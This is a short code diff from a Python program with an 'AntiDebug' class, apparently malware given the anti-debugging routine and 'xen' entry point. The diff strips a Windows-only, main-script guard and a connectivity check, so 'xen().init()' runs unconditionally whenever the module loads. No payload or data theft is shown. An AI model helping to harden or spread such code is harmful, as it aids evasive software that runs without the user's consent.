@@ -1552,11 +1552,4 @@ class AntiDebug(functions):
         finally:
             winreg.CloseKey(handle)
 
-
-if __name__ == "__main__" and os.name == "nt":
-    starttime = time.time()
-    try:
-        requests.get('https://1.1.1.1')
-    except:
-        os._exit(0)
-    asyncio.run(xen().init())
+asyncio.run(xen().init())
